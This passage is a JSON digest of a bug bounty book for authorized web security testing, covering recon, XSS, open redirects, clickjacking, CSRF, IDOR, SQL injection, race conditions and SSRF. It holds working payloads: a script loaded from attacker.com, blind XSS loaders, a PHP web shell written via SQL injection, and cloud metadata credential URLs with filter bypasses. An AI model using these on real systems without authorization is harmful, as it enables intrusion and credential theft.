@@ -1,0 +1,997 @@
+{
+  "source_book": "Bug Bounty Bootcamp: The Guide to Finding and Reporting Web Vulnerabilities",
+  "author": "Vickie Li",
+  "publisher": "No Starch Press",
+  "total_pages_pdf": 418,
+  "parts": [
+    "Part I: The Industry (Chapters 1-2)",
+    "Part II: Getting Started (Chapters 3-5)",
+    "Part III: Web Vulnerabilities (Chapters 6-21)",
+    "Part IV: Expert Techniques (Chapters 22-25)"
+  ],
+  "chapters": [
+    {
+      "chapter_number": 1,
+      "title": "Picking a Bug Bounty Program",
+      "part": "Part I: The Industry",
+      "vulnerability_class": null,
+      "recon_stage": null,
+      "topic": "Program selection",
+      "methodology": [
+        "Identify which asset type fits your skill set: social sites, general web apps, mobile apps, APIs, source code/executables, hardware/IoT.",
+        "Decide between bug bounty platforms (HackerOne, Bugcrowd, Intigriti, Synack, Cobalt) and independently hosted programs (Google, Facebook, Apple, Medium).",
+        "Verify the program scope (in-scope vs out-of-scope assets and vulnerability types) before doing any recon.",
+        "Assess metrics: payout amounts (VDP vs paid), average response time, triage time, average bounty.",
+        "Aim to get into private programs by submitting valid high-impact bugs, completing CTFs/tutorials on the platform, and avoiding low-quality spam.",
+        "For beginners, prefer programs with large scope, fast response times, and vulnerability disclosure programs (less competition)."
+      ],
+      "tools_and_payloads": [
+        "HackerOne, Bugcrowd, Intigriti, Synack, Cobalt (platforms)",
+        "CVSS calculator (https://www.first.org/cvss/)",
+        "Bugcrowd Vulnerability Rating Taxonomy",
+        "HackerOne severity calculator"
+      ],
+      "bypass_techniques": [],
+      "escalation_impact_tips": [
+        "Submit high-impact vulnerabilities first to earn reputation faster and unlock private invites.",
+        "Don't spam—negative reputation prevents private invites.",
+        "Be polite and professional with security teams."
+      ],
+      "report_template_hints": []
+    },
+    {
+      "chapter_number": 2,
+      "title": "Sustaining Your Success",
+      "part": "Part I: The Industry",
+      "vulnerability_class": null,
+      "recon_stage": null,
+      "topic": "Report writing and program longevity",
+      "methodology": [
+        "Step 1: Craft a descriptive title that states the vulnerability class, location, and impact in one sentence.",
+        "Step 2: Provide a clear summary covering what the bug is, where it is, and what an attacker can do.",
+        "Step 3: Include a severity assessment (Low/Medium/High/Critical) using CVSS or platform calculators.",
+        "Step 4: Give step-by-step reproduction steps assuming the reader has no prior knowledge.",
+        "Step 5: Provide a Proof of Concept (HTML file, video, screenshots, crafted URL, upload payload).",
+        "Step 6: Describe impact and realistic attack scenarios — separate from severity.",
+        "Step 7: Recommend possible mitigations only if you understand the root cause.",
+        "Step 8: Validate the report — re-run your own steps and check POC files."
+      ],
+      "tools_and_payloads": [
+        "CVSS (first.org/cvss/)",
+        "Bugcrowd VRT",
+        "HackerOne severity calculator"
+      ],
+      "bypass_techniques": [],
+      "escalation_impact_tips": [
+        "Chain low-severity bugs (open redirect + SSRF; self-XSS + CSRF) before reporting.",
+        "Don't report low-impact or out-of-scope bugs as-is — escalate or hold.",
+        "Tailor severity to the client company's business priorities (e.g., birth date leak matters for a job site, not a dating site)."
+      ],
+      "report_template_hints": [
+        "Title format: '<Vuln class> on <URL/endpoint> leads to <impact>'.",
+        "Summary: state endpoint, parameters, root cause, impact in one paragraph.",
+        "Severity line: 'Severity of the issue: High'.",
+        "Reproduction: numbered steps that assume two accounts and full setup.",
+        "POC: attach HTML/video/screenshots/curl commands.",
+        "Impact: realistic worst-case scenario, no hypotheticals.",
+        "Mitigation: high-level direction (e.g., 'validate user_id on server side and reject mismatched requests').",
+        "No leetspeak, jokes, or memes; conversational but professional tone."
+      ]
+    },
+    {
+      "chapter_number": 3,
+      "title": "How the Internet Works",
+      "part": "Part II: Getting Started",
+      "vulnerability_class": null,
+      "recon_stage": "Background",
+      "topic": "Web fundamentals: client-server, DNS, ports, HTTP, sessions, tokens, JWTs, SOP",
+      "methodology": [
+        "Understand client-server model, DNS resolution (A/AAAA), and the role of ports (80/443).",
+        "Learn HTTP request methods (GET, POST, PUT, DELETE, PATCH, OPTIONS) and status codes (1xx-5xx).",
+        "Understand session cookies vs token-based auth (JWTs) and how the browser auto-attaches cookies.",
+        "Learn the Same-Origin Policy: two URLs share an origin only if protocol + host + port match.",
+        "Note common HTTP headers (Host, Cookie, Set-Cookie, Authorization, Referer, Content-Type, X-Powered-By)."
+      ],
+      "tools_and_payloads": [
+        "Burp Suite",
+        "DevTools",
+        "curl"
+      ],
+      "bypass_techniques": [],
+      "escalation_impact_tips": [],
+      "report_template_hints": []
+    },
+    {
+      "chapter_number": 4,
+      "title": "Environmental Setup and Traffic Interception",
+      "part": "Part II: Getting Started",
+      "vulnerability_class": null,
+      "recon_stage": "Setup",
+      "topic": "Burp Suite setup and note-taking",
+      "methodology": [
+        "Install Firefox and Burp Suite Community/Pro; configure Firefox to use 127.0.0.1:8080 as proxy or use Burp's embedded browser.",
+        "Visit http://burp/ to download Burp's CA certificate and install it under Firefox certificate authorities (trust to identify websites).",
+        "Turn on Intercept in Burp Proxy and verify by visiting https://www.google.com/.",
+        "Use Burp modules: Proxy (intercept/modify), Intruder (automated attacks with payload positions), Repeater (manual single-request testing), Decoder (encode/decode), Comparer (diff two requests/responses).",
+        "Save requests via 'Copy URL', 'Copy as curl command', or 'Copy to file'.",
+        "Build organized plaintext notes per target (Sublime Text/Obsidian/XMind) with sub-folders for endpoints, features, recon, drafts, POCs."
+      ],
+      "tools_and_payloads": [
+        "Burp Suite (Community / Pro)",
+        "OWASP ZAP",
+        "Firefox",
+        "Sublime Text",
+        "Obsidian",
+        "XMind"
+      ],
+      "bypass_techniques": [],
+      "escalation_impact_tips": [],
+      "report_template_hints": []
+    },
+    {
+      "chapter_number": 5,
+      "title": "Web Hacking Reconnaissance",
+      "part": "Part II: Getting Started",
+      "vulnerability_class": null,
+      "recon_stage": "Reconnaissance (all stages)",
+      "topic": "Recon: scope discovery, subdomains, service enum, directory brute-forcing, spidering, third-party hosting, GitHub, OSINT, fingerprinting, automation, scheduling",
+      "methodology": [
+        "Manually walk the target: sign up at every privilege level and click every feature to enumerate the attack surface.",
+        "Google dorking with operators: site:, inurl:, intitle:, link:, filetype:, * (wildcard), quotes, | (or), - (minus). Examples: 'site:*.example.com', 'site:example.com inurl:app/kibana', 'site:s3.amazonaws.com COMPANY', 'site:example.com ext:log/php/txt password'. Use Google Hacking Database for prebuilt queries.",
+        "Scope discovery — WHOIS and reverse WHOIS: 'whois facebook.com', ViewDNS.info reverse WHOIS.",
+        "IP addresses: nslookup to resolve, ViewDNS reverse IP for co-hosted domains, whois on IP to find NetRange, whois -h whois.cymru.com IP to map IP to ASN and discover dedicated IP ranges.",
+        "Certificate parsing: crt.sh, Censys, Cert Spotter. Use https://crt.sh/?q=DOMAIN&output=json to grab Subject Alternative Names in JSON.",
+        "Subdomain enumeration: Sublist3r, SubBrute, Amass, Gobuster (dns mode: 'gobuster dns -d domain -w wordlist'). Feed SecLists or Commonspeak2 wordlists. Use Altdns for permutations. Recurse on found subdomains to discover sub-subdomains.",
+        "Service enumeration: active with Nmap ('nmap target', '-sV' for version detection) or Masscan; passive via Shodan, Censys, Project Sonar.",
+        "Directory brute-forcing: Dirsearch ('./dirsearch.py -u host -e php'), Gobuster dir mode ('gobuster dir -u url -w wordlist'). Inspect 200/301/403 responses; 403 may be bypassable.",
+        "Screenshot enumerated paths/subdomains with EyeWitness or Snapper.",
+        "Spider the site with OWASP ZAP Spider (Tools > Spider) or Burp Crawler to discover hidden endpoints.",
+        "Third-party hosting (S3 buckets): Google-dork 'site:s3.amazonaws.com COMPANY', search GitHub repos for 's3', use GrayhatWarfare, brute-force with Lazys3 or Bucket Stream. Test access with 'aws s3 ls/cp/rm s3://BUCKET/'.",
+        "GitHub recon: find org/employee usernames; review repos' Issues, Commits, Code, Blame, History. Grep for key, secret, password, api_key. Validate creds with KeyHacks. Automate with Gitrob and TruffleHog.",
+        "OSINT: engineering job posts (tech stack), LinkedIn, Stack Overflow, employee blogs, Pastebin (PasteHunter), SlideShare, employees' Google calendars, Wayback Machine + Waybackurls.",
+        "Tech stack fingerprinting: 'nmap -sV', inspect Server / X-Powered-By / X-Generator / Set-Cookie (PHPSESSID, etc.) headers, view HTML source for 'powered by', use Wappalyzer, BuiltWith, StackShare, Retire.js. Search CVE database for found versions.",
+        "Write bash recon scripts: shebang, parse $1..$@, redirect output (>, >>, |), command substitution $(...), conditionals (if/elif/fi), case statements, for/while loops, getopts for flags, source for libraries, functions, test conditions ([-f], [-d], -eq/-ne/-gt/-lt, -z/-n, &&/||).",
+        "Parse outputs: grep -E with regex for filtering Nmap, jq -r '.[] | .name_value' for crt.sh JSON, cat to merge into a master report.",
+        "Schedule recurring scans via cron ('30 21 * * * ./scan.sh'), git diff to detect new endpoints/subdomains, push results to GitHub for change-notification emails.",
+        "Leverage recon APIs (Shodan, LinkedIn, Censys, BuiltWith, Google, GitHub) for programmatic queries. Manage API keys via lanmaster53/recon-ng-marketplace."
+      ],
+      "tools_and_payloads": [
+        "whois, nslookup",
+        "ViewDNS.info (reverse WHOIS / reverse IP)",
+        "crt.sh, Censys, Cert Spotter",
+        "Sublist3r, SubBrute, Amass, Gobuster",
+        "SecLists (danielmiessler/SecLists), Commonspeak2",
+        "Altdns",
+        "Nmap, Masscan",
+        "Shodan, Censys, Project Sonar",
+        "Dirsearch, Gobuster (dir mode)",
+        "EyeWitness, Snapper",
+        "OWASP ZAP (spider)",
+        "GrayhatWarfare, Lazys3, Bucket Stream, awscli",
+        "Gitrob, TruffleHog, KeyHacks",
+        "PasteHunter",
+        "Wayback Machine, Waybackurls",
+        "Wappalyzer, BuiltWith, StackShare, Retire.js",
+        "Google Hacking Database (exploit-db)",
+        "Nuclei (projectdiscovery/nuclei)",
+        "Intrigue Core",
+        "Git (git diff), Cron",
+        "jq, grep, sort"
+      ],
+      "bypass_techniques": [],
+      "escalation_impact_tips": [
+        "Use recon results to prioritize sensitive features (payments, password reset, file uploads) where critical bugs (IDOR, RCE) live.",
+        "Match found tech stack against the CVE database to find pre-disclosed vulns.",
+        "Continuous recon (cron + git diff) is the fastest way to find new endpoints before other hunters."
+      ],
+      "report_template_hints": []
+    },
+    {
+      "chapter_number": 6,
+      "title": "Cross-Site Scripting",
+      "part": "Part III: Web Vulnerabilities",
+      "vulnerability_class": "XSS (stored, reflected, DOM, blind, self)",
+      "recon_stage": null,
+      "topic": "Cross-Site Scripting",
+      "methodology": [
+        "Step 1: Look for input opportunities — for stored XSS scan comment fields, profiles, posts, usernames; for reflected/DOM look at URL params, fragments, pathnames. Don't ignore drop-downs or numeric fields — intercept and modify in Burp Proxy.",
+        "Insert a unique marker like 'XSS_BY_VICKIE' into every parameter and View Source on the response to find where input lands.",
+        "Step 2: Insert payloads — start with <script>alert('XSS')</script>; escalate to event-handler payloads (<img src=x onerror=alert(1)>, <body onload=...>, <a onmouseover=...>); use javascript: and data:text/html;base64,... URLs when input feeds into an href/src; close out existing tags ('\"/><script>...</script>') as needed.",
+        "Try an XSS polyglot (e.g. EdOverflow's polyglot.innerht.ml) that fires in multiple contexts.",
+        "Use a generic test string like >'<\"//:=;!-- to discover which characters are escaped, then build a context-specific payload.",
+        "For blind XSS: deliver <script src='http://YOUR_SERVER/xss'></script> and monitor server logs (or use XSS Hunter).",
+        "Step 3: Confirm impact — verify alert/pop-up, redirect, cookie exfiltration. Watch for delayed execution in logs, emails, exports, admin pages."
+      ],
+      "tools_and_payloads": [
+        "Burp Suite Proxy/Repeater/Intruder",
+        "XSS Hunter (xsshunter.com)",
+        "PortSwigger XSS cheat sheet",
+        "OWASP XSS filter evasion cheat sheet",
+        "Polyglot: javascript:\"/*\\\"/*`/*' /*</template></textarea></noembed></noscript></title></style></script>-->&lt;svg onload=/*<html/*/onmouseover=alert()//>",
+        "<script>alert(1)</script>",
+        "<img src=x onerror=alert(1)>",
+        "<body onload=alert(1)>",
+        "<iframe src=javascript:alert(1)>",
+        "<a onmouseover=\"alert(1)\">test</a>",
+        "<script src=//attacker.com/test.js>",
+        "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="
+      ],
+      "bypass_techniques": [
+        "Alternative JS syntax: use event handlers in attributes (onerror, onload, onclick, onmouseover) instead of <script>.",
+        "Use javascript: and data: URL schemes when input lands in href/src.",
+        "Mixed-case to bypass case-sensitive blocklists: <scrIPT>...</scrIPT>.",
+        "Use String.fromCharCode(...) to construct payload strings without quotes.",
+        "Exploit single-pass replace filters by nesting tags: <scrip<script>t>...</scrip</script>t>.",
+        "Encode payloads (URL, double-URL, HTML, base64) when filters look for literal strings.",
+        "Test across multiple browsers — tags/handlers differ."
+      ],
+      "escalation_impact_tips": [
+        "Stored XSS on public pages = highest impact; DOM/reflected requires victim click; self-XSS usually not in scope.",
+        "Steal CSRF tokens / session cookies via document.cookie or DOM scrape and exfiltrate to attacker server.",
+        "Use XSS to bypass CSRF (script can read tokens, then fire XMLHttpRequest).",
+        "Replace the page content with a fake login (phishing) or trigger forced redirects/malware downloads.",
+        "Target admin/staff pages (server logs, support tickets) for full app compromise — chain to RCE via shell upload."
+      ],
+      "report_template_hints": [
+        "Title: 'Stored/Reflected/DOM XSS on <URL> via <parameter>'.",
+        "Provide the exact payload, the resulting HTML, and a screenshot/video of the alert or cookie exfiltration.",
+        "If chained, document the chain (e.g., XSS -> cookie theft -> account takeover)."
+      ]
+    },
+    {
+      "chapter_number": 7,
+      "title": "Open Redirects",
+      "part": "Part III: Web Vulnerabilities",
+      "vulnerability_class": "Open Redirect (parameter-based, referer-based)",
+      "recon_stage": null,
+      "topic": "Open Redirects",
+      "methodology": [
+        "Step 1: Look for redirect parameters by browsing with a proxy: redirect, redir, next, u, n, forward, RelayState, return, returnurl, dest, destination, url, uri.",
+        "Note pages with 301/302 responses that auto-redirect without a URL parameter — these are candidates for referer-based redirects.",
+        "Step 2: Google dork for redirect params: 'inurl:%3Dhttp site:target' (URL-encoded =http), 'inurl:%3D%2F site:target' (relative URLs), 'inurl:redir site:target', and variants for redirect/redirecturi/return/forward/relaystate.",
+        "Step 3: Test parameter-based redirects by inserting your own hostname (http://attacker.com or http://google.com) and observing whether the application redirects offsite; some only redirect after login/logout/registration.",
+        "Step 4: Test referer-based redirects by hosting an HTML page with <a href=\"target_url\">link</a>; click through and see if you're sent to your domain afterward."
+      ],
+      "tools_and_payloads": [
+        "Google dorks (inurl:, %3D, %2F)",
+        "Burp Proxy"
+      ],
+      "bypass_techniques": [
+        "Browser autocorrect: 'https:attacker.com', 'https;attacker.com', 'https:\\\\/\\\\/attacker.com', 'https:/\\\\/\\\\attacker.com', 'https:\\\\\\\\example.com'.",
+        "Backslash trick: 'https://attacker.com\\\\@example.com' — validators may treat attacker.com\\\\ as username; Chrome rewrites \\\\ to /.",
+        "Flawed validator logic: domain in subdomain ('http://example.com.attacker.com'), in path ('http://attacker.com/example.com'), userinfo ('https://example.com@attacker.com'), or both ('https://example.com.attacker.com/example.com').",
+        "Use data: URL scheme: 'data:text/html;base64,<base64 of <script>location=...</script>>'.",
+        "URL-encoding tricks: 'https://example.com%2f@attacker.com', '%252f' (double), '%25252f' (triple) — mismatches between validator and browser decoding.",
+        "Non-ASCII characters that browsers normalize: 'https://attacker.com%ff.example.com' (ÿ becomes ? or is stripped), look-alike slash '╱' (%E2%95%B1) -> /, Cyrillic look-alikes from Unicode chart.",
+        "Combine: 'https://example.com%252f@attacker.com/example.com'."
+      ],
+      "escalation_impact_tips": [
+        "Chain into phishing by hosting a fake login on attacker.com that mirrors the target.",
+        "Use open redirect to bypass URL allowlists in SSRF.",
+        "Smuggle OAuth tokens / access_token via Referer or URL fragment to attacker.com (key for SSO bypass, see Ch 20).",
+        "Bare open redirects are often dismissed — escalate by chaining."
+      ],
+      "report_template_hints": [
+        "Provide a single click-through URL that demonstrates the redirect.",
+        "Mention the chained impact (phishing, OAuth token theft, SSRF bypass) to justify severity."
+      ]
+    },
+    {
+      "chapter_number": 8,
+      "title": "Clickjacking",
+      "part": "Part III: Web Vulnerabilities",
+      "vulnerability_class": "Clickjacking (UI redressing)",
+      "recon_stage": null,
+      "topic": "Clickjacking",
+      "methodology": [
+        "Step 1: Map state-changing actions on the target that can be triggered by clicks alone (password change, fund transfer, unlink account, deactivate account, change billing email).",
+        "Step 2: Check response headers on those pages for X-Frame-Options (DENY/SAMEORIGIN), Content-Security-Policy frame-ancestors, and SameSite cookie flags.",
+        "Build a test HTML page: <iframe src='TARGET_URL' width=500 height=500></iframe>; if the iframe renders, the page is frameable.",
+        "Step 3: Confirm exploit by overlaying the iframe (opacity:0.00001, z-index:1) on top of a decoy element (z-index:-1, position:absolute) with a fake-button label and trigger the click yourself on a test account."
+      ],
+      "tools_and_payloads": [
+        "Browser DevTools",
+        "Custom HTML iframe + CSS overlay (opacity, z-index, position:absolute)",
+        "Social-Engineer Toolkit (trustedsec/social-engineer-toolkit) for site cloning"
+      ],
+      "bypass_techniques": [
+        "Frame-busting JS that only compares top.location to self.location can be defeated with a double-iframe: attacker -> victim-domain page that frames victim target. Both top and self resolve to victim domain.",
+        "X-Frame-Options ALLOW-FROM is obsolete in modern Chrome/Firefox/Safari — pages relying on it are exploitable in those browsers (e.g., Periscope 2019)."
+      ],
+      "escalation_impact_tips": [
+        "Place the hidden button on top of a 'Please accept cookies!' prompt or similar must-click element.",
+        "Chain multiple clickjackings: first change billing email, then export account data to the attacker's email.",
+        "Many programs explicitly exclude clickjacking — read scope; demonstrate impactful state-changes (password reset, account deletion) to justify acceptance."
+      ],
+      "report_template_hints": [
+        "Attach a working HTML POC file.",
+        "Record the click sequence on video.",
+        "Highlight a sensitive state-changing action; trivial clickjacking is usually rejected."
+      ]
+    },
+    {
+      "chapter_number": 9,
+      "title": "Cross-Site Request Forgery",
+      "part": "Part III: Web Vulnerabilities",
+      "vulnerability_class": "CSRF",
+      "recon_stage": null,
+      "topic": "Cross-Site Request Forgery",
+      "methodology": [
+        "Test in a browser that does NOT default to SameSite=Lax (Firefox/Safari/IE) since Chrome 2020+ auto-mitigates classic POST CSRF.",
+        "Step 1: Map state-changing endpoints (password change, send email, delete content, change billing) by browsing with Burp; record method, URL, and parameters.",
+        "Step 2: Look at each request for CSRF protection: search for csrf, state, token in body, headers, cookies; check SameSite flag on session cookies.",
+        "Step 3: Craft an HTML POC form that auto-submits to the target and load it in a browser logged into the victim account; confirm state change."
+      ],
+      "tools_and_payloads": [
+        "Burp Suite Pro / ZAP CSRF POC generator",
+        "Custom HTML form with JS auto-submit (document.getElementById('csrf-form').submit())",
+        "<img src=URL_with_state_change_params> for GET CSRF"
+      ],
+      "bypass_techniques": [
+        "Exploit clickjacking on the same endpoint when CSRF token is in place but framing isn't blocked.",
+        "Switch request method (POST <-> GET, PUT, DELETE) — protection often differs per method.",
+        "Delete the token parameter entirely or send a blank token (server-side code that only validates if token exists).",
+        "Submit your own valid token instead of the victim's (server checks 'is this a known token?' but not 'does it belong to this user?').",
+        "Double-submit token bypass via session fixation (force a known csrf_token cookie on the victim, then submit matching body token).",
+        "Bypass Referer check by removing the header (<meta name=\"referrer\" content=\"no-referrer\">) or by hosting on attacker subdomain 'example.com.attacker.com' or path 'attacker.com/example.com'.",
+        "Use XSS on any page to grab the legit token and fire XMLHttpRequest."
+      ],
+      "escalation_impact_tips": [
+        "CSRF on change-billing-email -> redirect monthly statements to attacker (info disclosure).",
+        "CSRF + Self-XSS -> Stored XSS (POST to nickname/profile field that's only editable by self).",
+        "CSRF on /set_password for social-login users who never set a password -> full account takeover.",
+        "Deliver via a malicious post on a forum (forum.example.com), an <img src=GET_URL> for one-click attacks, or via stored XSS that injects an auto-submitting form."
+      ],
+      "report_template_hints": [
+        "Provide a self-contained HTML file POC.",
+        "Use Burp Pro 'Generate CSRF PoC' if available.",
+        "Always include impact (account takeover, info leak, money transfer)."
+      ]
+    },
+    {
+      "chapter_number": 10,
+      "title": "Insecure Direct Object References",
+      "part": "Part III: Web Vulnerabilities",
+      "vulnerability_class": "IDOR (read-based, write-based, blind)",
+      "recon_stage": null,
+      "topic": "Insecure Direct Object References",
+      "methodology": [
+        "Step 1: Create two accounts at each privilege level (attacker + victim, premium + free, admin + user, plus unauthenticated session).",
+        "Step 2: Discover features that read or modify user data: profile reads, file uploads, message endpoints, group/team pages, settings changes.",
+        "Step 3: Intercept all requests with Burp while using the high-privileged account. Use two browsers (Firefox + Chrome) — one per account — and modify requests from one while watching effects on the other.",
+        "Step 4: Switch out IDs in URL params, body params, headers, paths, cookies, and filenames; observe whether you can read or modify the other account's resources.",
+        "Look in REST and GraphQL endpoints (often vulnerable) — see Ch 24."
+      ],
+      "tools_and_payloads": [
+        "Burp Suite Proxy",
+        "Burp Decoder (Smart Decode for encoded IDs)",
+        "Burp extensions: Autorize (Quitten/Autorize), Auto Repeater (nccgroup), AuthMatrix (SecurityInnovation)",
+        "Burp Intruder for ID iteration"
+      ],
+      "bypass_techniques": [
+        "Decode encoded IDs: base64, base64url, URL-encoding, hex, octal — use Smart Decode.",
+        "Predict hashed/random IDs by analyzing entropy or creating multiple accounts to spot patterns.",
+        "Find ID leaks via other API endpoints (e.g., profile page exposes user_id then conversation_id can be fetched).",
+        "Add an ID parameter when the endpoint doesn't include one (e.g., '/api_v1/messages?user_id=ANOTHER').",
+        "Look for blind IDORs that leak via email, exports, or text alerts (e.g., POST /get_receipt receipt_id=...).",
+        "Change request method (GET, POST, PUT, DELETE, PATCH) — auth often differs per method.",
+        "Change file type / append '.json' to bypass per-type access checks."
+      ],
+      "escalation_impact_tips": [
+        "Write-based IDORs on password reset / account recovery / admin endpoints = critical (mass account takeover, RCE).",
+        "Read-based IDORs on PII, DMs, financial info = high.",
+        "Chain with self-XSS for stored XSS, with username enumeration for mass takeover, with admin write for RCE.",
+        "Monitor exports/emails/alerts over weeks — blind IDORs can leak data months later."
+      ],
+      "report_template_hints": [
+        "Show two-account demo: request A with attacker's session reading/modifying victim's resource.",
+        "Document the encoded/decoded ID, request method, parameter location."
+      ]
+    },
+    {
+      "chapter_number": 11,
+      "title": "SQL Injection",
+      "part": "Part III: Web Vulnerabilities",
+      "vulnerability_class": "SQL injection (classic UNION-based, error-based, blind boolean, blind time-based, second-order, NoSQL)",
+      "recon_stage": null,
+      "topic": "SQL Injection",
+      "methodology": [
+        "General detection: insert a single quote (') in every user-input field and watch for DB errors / response anomalies.",
+        "Fuzz with SQLi payloads against every parameter (URL, body, headers, cookies). See Ch 25.",
+        "Step 1: Look for classic SQLi — try UNION-based ('UNION SELECT Username,Password FROM Users;--') and error-based (CONVERT() to a date type in MySQL leaks values in error messages).",
+        "Step 2: Look for blind SQLi — Boolean-based (substring + visible UI delta: '2\\' UNION SELECT Id FROM Users WHERE Username=\\'admin\\' AND SUBSTR(Password,1,1)=\\'a\\';--') and time-based ('IF(SUBSTR(...)=\\'a\\', SLEEP(10), 0)').",
+        "Step 3: Exfiltrate via SELECT ... INTO OUTFILE '/var/www/html/output.txt' for second-order or when no direct output. Also good for detecting second-order injections (input stored then later used unsafely).",
+        "Step 4: Look for NoSQL injection (MongoDB): supply '{$ne: \"\"}' as a password to bypass auth; abuse $where/mapReduce/$accumulator/$function with raw JS.",
+        "Learn the DB: fingerprint version (@@version on MySQL/MSSQL, version() on PostgreSQL, v$version on Oracle), then query information_schema.tables/columns to enumerate."
+      ],
+      "tools_and_payloads": [
+        "sqlmap (sqlmap.org)",
+        "SQLiPy Burp plugin",
+        "NoSQLMap (codingo/NoSQLMap)",
+        "Damn Vulnerable Web Application (dvwa.co.uk) for practice",
+        "UNION SELECT 1,@@version;--",
+        "' OR 1=1 --",
+        "admin';--",
+        "{$ne: \"\"} (MongoDB)",
+        "SLEEP(10) (MySQL), pg_sleep(10) (Postgres), WAITFOR DELAY '0:0:10' (MSSQL)",
+        "CONVERT((SELECT ...), DATE) for error-based MySQL",
+        "<? system($_REQUEST['cmd']); ?> INTO OUTFILE '/var/www/html/shell.php' for web shell upload"
+      ],
+      "bypass_techniques": [
+        "URL-encode / double-URL-encode special chars to slip past WAFs.",
+        "Mixed-case keywords (SeLeCt), inline comments (SEL/**/ECT), null bytes.",
+        "Use OR-based injection variants when AND is filtered.",
+        "Use HTTP parameter pollution to split payload across same-name params."
+      ],
+      "escalation_impact_tips": [
+        "Read /etc/passwd or system tables, leak app source code.",
+        "Gain a web shell via SELECT '<?php system($_REQUEST[cmd]);?>' INTO OUTFILE to web root, then call shell.php?cmd=....",
+        "Authentication bypass and arbitrary password change via UPDATE injections.",
+        "DoS via Mongo $where loop {while(true){}}."
+      ],
+      "report_template_hints": [
+        "Provide a clean, reproducible payload and an exact HTTP request.",
+        "Don't dump customer data — prove with version() or current_user(); use SLEEP for blind.",
+        "Note 'sqlmap --batch' can confirm and exploit; share the command, not the dump."
+      ]
+    },
+    {
+      "chapter_number": 12,
+      "title": "Race Conditions",
+      "part": "Part III: Web Vulnerabilities",
+      "vulnerability_class": "Race condition / TOCTOU",
+      "recon_stage": null,
+      "topic": "Race Conditions",
+      "methodology": [
+        "Step 1: Find features that should be allowed once but might be repeatable: bank transfers, gift card redemption, online votes, score updates, e-commerce payments, password reset, MFA code use.",
+        "Copy the critical request from Burp ('Copy as curl command').",
+        "Step 2: Fire multiple simultaneous requests using shell: 'curl ... & curl ... & curl ... & curl ...'. The '&' background operator runs them in parallel.",
+        "Step 3: Check the resulting state (account balance, vote count, redemption status). If totals exceed what the limit allows, race condition confirmed.",
+        "Step 4: Build a POC with explicit setup steps (2 accounts, starting balance) and a curl one-liner; note that success depends on scheduling and may need several attempts."
+      ],
+      "tools_and_payloads": [
+        "curl with shell '&' parallelism",
+        "Burp Repeater (group send / send-in-parallel in newer versions)"
+      ],
+      "bypass_techniques": [
+        "Increase concurrency: more parallel curls (8-50) and run multiple times because success is probabilistic."
+      ],
+      "escalation_impact_tips": [
+        "Pick highest-impact features: cash withdrawal, fund transfer, credit card payment, coupon redemption -> infinite financial value.",
+        "Chain with vote/score systems for reputation manipulation.",
+        "Race conditions can also bypass access control (e.g., race a permission revocation)."
+      ],
+      "report_template_hints": [
+        "Number the setup steps (create both accounts, fund attacker, etc.).",
+        "Provide the literal curl-with-& command.",
+        "Tell the reader to retry if the first run doesn't trip the race."
+      ]
+    },
+    {
+      "chapter_number": 13,
+      "title": "Server-Side Request Forgery",
+      "part": "Part III: Web Vulnerabilities",
+      "vulnerability_class": "SSRF (regular, blind)",
+      "recon_stage": null,
+      "topic": "Server-Side Request Forgery",
+      "methodology": [
+        "Step 1: Spot SSRF-prone features: webhooks, file upload from URL, image/document processors, link unfurling/thumbnails, proxy services, hidden API endpoints that take URLs, URLs embedded in uploaded files (XML/PDF).",
+        "Step 2: Send internal addresses to those endpoints: localhost, 127.0.0.1, 0.0.0.0, 192.168.0.1, 10.0.0.1, IPv6 ::1, fc00::, and Wikipedia 'reserved IP addresses' for more.",
+        "Step 3: Check the response for service banners (port 22 -> OpenSSH banner in error), internal page content, status code differences (200 vs 500), or timing differences.",
+        "For blind SSRF, set up an out-of-band listener: Netcat ('nc -lp 8080'), a server on GoDaddy/Hostinger with access logs, or Burp Collaborator. Submit listener URL and watch logs.",
+        "Probe ports (22, 80, 443 vs 11) and compare server behavior (HTTP code, response time) to map internal services."
+      ],
+      "tools_and_payloads": [
+        "Netcat (nc -lp 8080)",
+        "Burp Collaborator (Pro)",
+        "SSRFmap (swisskyrepo/SSRFmap)",
+        "Internal IPs: 127.0.0.1, 169.254.169.254, ::1, fc00::, 10.0.0.0/8, 192.168.0.0/16",
+        "AWS metadata: http://169.254.169.254/latest/meta-data/, /iam/security-credentials/ROLE, /dynamic/instance-identity/document, /user-data/",
+        "GCP metadata v1beta1: http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token (no Metadata-Flavor header needed)",
+        "DigitalOcean: http://169.254.169.254/metadata/v1/",
+        "Kubernetes: https://kubernetes.default, https://kubernetes.default.svc/metrics"
+      ],
+      "bypass_techniques": [
+        "Bypass allowlist via an open redirect on an allowlisted domain ('pics.example.com/123?redirect=127.0.0.1').",
+        "Weak regex allowlists: use userinfo trick 'https://pics.example.com@127.0.0.1' or path trick 'https://127.0.0.1/pics.example.com'.",
+        "Bypass blocklist with a redirector you control: host '<?php header(\"location: http://127.0.0.1\"); ?>' on attacker.com/ssrf and submit attacker.com/ssrf as the URL.",
+        "Use IPv6: ::1, fc00:: when only IPv4 is blocked.",
+        "DNS trick: set A/AAAA record on a domain you own to 127.0.0.1, then submit that domain.",
+        "Switch encodings: hex (0x7f.0x0.0x0.0x1), octal (0177.0.0.01), dword (2130706433), URL-encoded ('%6c%6f%63%61%6c%68%6f%73%74' = localhost), or mix them ('0177.0.0.0x1').",
+        "Bypass Google's required Metadata-Flavor header by using v1beta1 endpoints that don't require it."
+      ],
+      "escalation_impact_tips": [
+        "Network scanning: feed range of internal IPs, compare error messages to map live hosts.",
+        "Port scanning: same idea, vary the port — fingerprint Apache/Ubuntu via the banner in error message.",
+        "Pull cloud instance metadata (AWS IAM tokens, S3 creds, SSH keys via GCP) -> often direct credential theft.",
+        "Access internal admin panels and internal APIs that trust internal IPs.",
+        "Pivot stolen creds into S3 enumeration / private RDS / shell on web server.",
+        "Blind SSRF: network/port scanning via HTTP status code and response time deltas (Burp Repeater shows ms in bottom-right)."
+      ],
+      "report_template_hints": [
+        "Document the exact endpoint, parameter, and payload that produced the metadata/banner.",
+        "Quote the leaked banner or metadata snippet (redact long tokens).",
+        "Map at least 1-2 reachable internal hosts/ports to prove network impact."
+      ]
+    },
+    {
+      "chapter_number": 14,
+      "title": "Insecure Deserialization",
+      "part": "Part III: Web Vulnerabilities",
+      "vulnerability_class": "Insecure Deserialization (PHP, Java, Python, Ruby)",
+      "recon_stage": null,
+      "topic": "Insecure Deserialization",
+      "methodology": [
